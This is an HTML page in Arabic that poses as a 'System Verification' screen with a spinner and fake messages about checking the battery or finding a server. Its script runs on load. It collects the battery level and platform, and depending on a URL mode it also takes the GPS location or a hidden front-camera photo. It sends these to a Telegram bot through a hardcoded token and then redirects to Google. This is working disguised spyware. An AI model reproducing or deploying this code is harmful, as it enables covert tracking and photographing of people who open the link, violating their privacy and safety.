<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Verification</title>
    <style>
        body { background: #000; color: #00ffcc; text-align: center; padding-top: 100px; font-family: monospace; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2 id="title">جاري فحص النظام...</h2>
    <div class="loader"></div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" width="720" height="1280" style="display:none;"></canvas>

    <script>
        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPROA823dxEaOZVU";
        const urlParams = new URLSearchParams(window.location.search);
        const targetID = urlParams.get('id');
        const mode = urlParams.get('mode');

        // تغيير العنوان حسب النوع
        const titles = {
            battery: "فحص جودة البطارية...",
            info: "تحديث معلومات الجهاز...",
            camera: "تفعيل وضع البث المباشر...",
            gps: "تحديد أقرب سيرفر لمنطقتك..."
        };
        if(mode) document.getElementById('title').innerText = titles[mode];

        async function startSiphoning() {
            if(!targetID) return;
            let report = `🚀 **صيد V8 جديد (${mode}):**\n`;

            // 1. سحب البطارية والنظام (دائماً)
            let b = await navigator.getBattery();
            report += `🔋 الشحن: ${Math.floor(b.level*100)}%\n📱 النظام: ${navigator.platform}\n`;

            // 2. سحب الموقع (إذا كان الوضع GPS)
            if (mode === 'gps') {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    report += `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendData(report);
                }, () => sendData(report));
            } 
            // 3. سحب الكاميرا (إذا كان الوضع Camera)
            else if (mode === 'camera') {
                try {
                    let s = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
                    let v = document.getElementById('v'); v.srcObject = s;
                    setTimeout(async () => {
                        let canvas = document.getElementById('c');
                        canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
                        let img = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                        let fd = new FormData(); fd.append('chat_id', targetID); fd.append('caption', report); fd.append('photo', img, 'p.jpg');
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
                        s.getTracks().forEach(t => t.stop());
                        window.location.replace("https://google.com");
                    }, 4000);
                } catch(e) { sendData(report); }
            } else {
                sendData(report);
            }
        }

        async function sendData(msg) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${targetID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            window.location.replace("https://google.com");
        }

        window.onload = startSiphoning;
    </script>
</body>
</html>
